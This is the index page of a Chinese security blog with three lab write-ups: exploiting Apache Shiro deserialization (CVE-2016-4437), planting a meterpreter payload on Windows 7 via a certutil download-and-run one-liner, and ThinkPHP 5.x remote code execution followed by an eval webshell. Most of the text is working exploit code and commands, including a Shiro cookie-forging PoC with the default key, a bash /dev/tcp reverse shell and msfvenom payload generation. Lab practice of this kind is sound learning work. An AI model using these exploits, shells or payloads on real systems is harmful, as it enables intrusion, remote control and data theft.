<!DOCTYPE html>
<html lang="zh-CN">
<head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hexo
        
    </title>
    <link rel="icon" href="/img/favicon.png"/>
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    
<link rel="stylesheet" href="/css/hljs.min.css">

    
<script src="/js/hljs.min.js"></script>
  
    
<script src="/js/gitment.browser.js"></script>
  
<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hexo
        </a>
    </h1>
    <h2>
        <a class="motto">
            Ponyo loves Sōsuke!
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/vevlins/" target="_blank" rel="noopener" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
                <li class="menu-item">
                    <a class="menu-item-link search">
                        Search                   
                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
                    </a>
                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)"></input>
                </li>
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2020/04/18/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"> 
                    shiro反序列化漏洞复现 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-04-18   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
<li>vulhub靶场搭建</li>
</ol>
<p><strong>参照官网：<a href="https://vulhub.org/#/docs/install-docker-one-click/" target="_blank" rel="noopener">https://vulhub.org/#/docs/install-docker-one-click/</a></strong><br>    1. 安装docker：<code>curl -s https://get.docker.com/ | sh</code><br>    2. 安装pip：<code>curl -s https://bootstrap.pypa.io/get-pip.py | python</code><br>    3. 安装docker-compose：<code>pip install docker-compose</code><br>    4. 拉取Vulhub到本地：<code>git clone https://github.com/vulhub/vulhub.git</code></p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><ol>
<li>cd到 ”/vulhub/shiro/cve-2016-4437“ 目录，启动环境：<code>docker-compose up -d</code></li>
<li>访问本地8080端口，靶场界面如下：</li>
</ol>
<p><em>不清楚端口的可以执行<code>docker ps -a</code> 查看映射端口</em><br><img src="https://i.loli.net/2020/04/18/EHmc7T28piaJVUL.jpg" alt=""></p>
<p>##开整</p>
<ol>
<li>github下载‘ysoserial-master-30099844c6-1.jar’</li>
</ol>
<p><strong>付下载链接：<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" target="_blank" rel="noopener">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></strong><br>2. poc脚本：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-30099844c6-1.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>

<p>  <strong>要求 ysoserial-master-30099844c6-1.jar和poc.py放在同一目录下</strong></p>
<ol start="3">
<li><p>执行脚本生成恶意cookie：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py x.x.x.x:1099  (x.x.x.x:攻击方ip，端口可自定，注意与后面的操作对应)</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>注意：1. 在python2环境下运行。2.报错“No matching distribution found for Crypto.Cipher”，解决：<code>pip install pycrypto</code></strong></p>
<ol start="4">
<li>shellcode及加密</li>
</ol>
<ul>
<li>加密网站：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;7878 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2020/04/18/hOsK6wqxXeJUnpl.jpg" alt=""></li>
</ul>
<ol start="5">
<li>端口监听<ol>
<li>监听shell：<code>ncat -lv -p 7878</code></li>
<li>监听JRMP端口：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &#39;加密后的反弹shell&#39;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li>burp发送恶意cookie<br><img src="https://i.loli.net/2020/04/18/DxvGtlHNMqjW4EB.jpg" alt=""></li>
<li>shell反弹<br><img src="https://i.loli.net/2020/04/18/wlchNRvItC5AxUd.jpg" alt=""></li>
</ol>

                
            </div>
            <div class="continue">
            <a href="/2020/04/18/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell2/"> 
                    vulnstack靶场学习记录-反弹shell2 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-04-01   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <p><strong>本机生成shell。开启http服务，监听。靶机下载shell并执行。</strong></p>
<h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>win7: 172.16.10.136    mac：172.16.10.1</p>
<h1 id="生成shell"><a href="#生成shell" class="headerlink" title="生成shell"></a>生成shell</h1><ol>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l paloads</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2020/04/01/jsk6CbwHfvJIpm4.jpg" alt=""></li>
<li>找到“windows/meterpreter_reverse_tcp   Connect back to attacker and spawn a Meterpreter shell”<br><img src="https://i.loli.net/2020/04/01/1cXkTaqjMUDi8rO.jpg" alt=""></li>
<li>保存在自定目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter_reverse_tcp lhost&#x3D;攻击方ip lport&#x3D;反弹端口 -f exe -o ~&#x2F;tools&#x2F;test.exe</span><br><span class="line">-f：格式</span><br><span class="line">-o：路径</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><img src="https://i.loli.net/2020/04/01/UmPZRQvthwy1jOX.jpg" alt=""></p>
<h1 id="在相应目录下打开http服务"><a href="#在相应目录下打开http服务" class="headerlink" title="在相应目录下打开http服务"></a>在相应目录下打开http服务</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/04/01/gTbLBPYyvQUFtCj.jpg" alt=""><br><img src="https://i.loli.net/2020/04/01/zgDVnqlXukvjcR6.jpg" alt=""></p>
<h1 id="msf开启监听-注意监听端口跟之前“生成shell-3-”中是否一致"><a href="#msf开启监听-注意监听端口跟之前“生成shell-3-”中是否一致" class="headerlink" title="msf开启监听(注意监听端口跟之前“生成shell-3.”中是否一致)"></a>msf开启监听(注意监听端口跟之前“生成shell-3.”中是否一致)</h1><ol>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -p windows&#x2F;meterpreter_reverse_tcp -H 172.16.10.1 -P 4444</span><br></pre></td></tr></table></figure>
 <img src="https://i.loli.net/2020/04/01/3vwP4Xhpyfx1GkK.jpg" alt=""></li>
<li>执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;10.0.3.120&#x2F;jet.exe &amp;jet.exe &amp;del jet.exe</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2020/04/01/gTOnHJNIdWfDm3q.jpg" alt=""></li>
<li>成功<br><img src="https://i.loli.net/2020/04/01/9PVRaHYr8gk5vbT.jpg" alt=""></li>
<li>“sessions 1”进入meterpreter命令界面<br><img src="https://i.loli.net/2020/04/01/5pzQrF8fGH6YdEL.jpg" alt=""></li>
</ol>

                
            </div>
            <div class="continue">
            <a href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell2/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/"> 
                    vulnstack靶场学习记录-反弹shell1 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-04-01   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <h1 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h1><ol>
<li>双网卡win7 模拟内外网<ol>
<li>内网 192.168.138.136</li>
<li>外网 172.16.10.128</li>
</ol>
<ul>
<li>普通用户heart/2020</li>
<li>域管理 Administrator/dc123.com</li>
</ul>
</li>
<li>win2008 <ol>
<li>192.168.138.138</li>
</ol>
</li>
</ol>
<h1 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h1><p>本机ip（vmnet8）  1. 172.16.10.1<br>本机与win7网卡b模拟外网环境；win2008和win7网卡a模拟内网环境</p>
<h1 id="靶机准备"><a href="#靶机准备" class="headerlink" title="靶机准备"></a>靶机准备</h1><ul>
<li>win7靶机以非域管理员身份打开  C:\phpstudy\phpstudy.exe</li>
</ul>
<h1 id="靶机端口扫描"><a href="#靶机端口扫描" class="headerlink" title="靶机端口扫描"></a>靶机端口扫描</h1><p><img src="https://i.loli.net/2020/04/01/XQPHr7B9kL5RZKe.jpg" alt=""></p>
<ol>
<li>172.16.10.128 80/3306端口</li>
</ol>
<h1 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h1><ol>
<li>thinkphp架构<br><img src="https://i.loli.net/2020/04/01/yZrgKXncB6D8vtu.jpg" alt=""></li>
<li>访问错误页面，得到版本型号<br><img src="https://i.loli.net/2020/04/01/Oi2p4bDMNknAozJ.jpg" alt=""></li>
</ol>
<h1 id="thinkphp-rce利用"><a href="#thinkphp-rce利用" class="headerlink" title="thinkphp rce利用"></a>thinkphp rce利用</h1><ol>
<li><p><code>searchsploit thinkphp</code></p>
</li>
<li><p>找到对应版本 5.X, -m参数导出到本地<br><code>searchsploit -m exploits/php/webapps/46150.txt</code></p>
</li>
<li><p>读取载荷信息<br><code>cat 46150.txt</code><br><img src="https://i.loli.net/2020/04/01/wif2Y3ZaEWR7srB.jpg" alt=""></p>
</li>
<li><p>找到对应版本，用的第三个payload，修改最后的参数值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp_5.0.22&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/04/01/SMHgjGFepZIDsR2.jpg" alt=""></p>
<ul>
<li><p>成功执行了系统命令–此时只是调用系统函数执行的系统命令，我们需要得到可交互式的shell</p>
</li>
<li><p>采用的方式是先在web端写入webshell源码，用蚁剑连接之后，用蚁剑上传冰蝎的phpshell，冰蝎连接。</p>
</li>
</ul>
</li>
</ol>
<h1 id="传马得shell"><a href="#传马得shell" class="headerlink" title="传马得shell"></a>传马得shell</h1><ol>
<li>写入wehshell源码<br><code>echo ^&lt;?php eval($_POST[&#39;a&#39;]);?^&gt; &gt; 5.php</code> (cmd 转义字符 ^)<ul>
<li>文件有了</li>
</ul>
</li>
</ol>
<p><img src="https://i.loli.net/2020/04/01/bSmqGo8e3cNZxsp.jpg" alt=""></p>
<ul>
<li>源码无误</li>
</ul>
<p><img src="https://i.loli.net/2020/04/01/aGxHimbByILvU43.jpg" alt=""><br>2. 连蚁剑<br><img src="https://i.loli.net/2020/04/01/jAzH1c3VXkK6Crs.jpg" alt=""><br>3. 上传文件–冰蝎的webshell<br>4. 冰蝎连 <code>http://172.16.10.128/shell.php</code><br>    1. <img src="https://i.loli.net/2020/04/01/Ya7JK2RveNiuIw6.jpg" alt=""><br>    2. <img src="https://i.loli.net/2020/04/01/38Q4alLj5FJyhiq.jpg" alt=""></p>
<h1 id="反弹msfshell"><a href="#反弹msfshell" class="headerlink" title="反弹msfshell"></a>反弹msfshell</h1><ol>
<li>根据上面的提示<br> <img src="https://i.loli.net/2020/04/01/sPLfaMB6KDmjSlA.jpg" alt=""></li>
<li>反弹msfshell</li>
</ol>
<p><img src="https://i.loli.net/2020/04/01/zKWy7xC9Sdih6mo.jpg" alt=""></p>

                
            </div>
            <div class="continue">
            <a href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell1/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    
<script src="/js/jquery.js"></script>

    
<script src="/js/toki.js"></script>
  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>